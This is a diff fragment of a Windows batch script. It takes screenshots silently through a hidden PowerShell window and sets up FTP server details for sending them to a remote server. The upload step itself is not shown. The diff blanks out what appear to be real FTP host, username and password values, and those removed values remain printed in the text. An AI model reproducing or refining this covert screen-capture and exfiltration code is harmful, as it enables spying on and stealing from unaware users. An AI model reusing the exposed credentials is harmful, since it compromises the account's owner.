@@ -8,10 +8,10 @@ set "batchDir=%~dp0"
 set "numScreenshots=3"
 
 :: Set FTP server details
-set "ftpServer=ftpupload.net"
-set "ftpUser=thsi_37027586"
-set "ftpPass=HZP??GKY"
-set "ftpDir=/htdocs/Upload"
+set "ftpServer="
+set "ftpUser="
+set "ftpPass="
+set "ftpDir=" :: eg /htdocs/Upload
 
 for /L %%i in (1,1,%numScreenshots%) do (
     powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('%batchDir%screenshot_%%i.png'); $graphics.Dispose(); $bitmap.Dispose();"
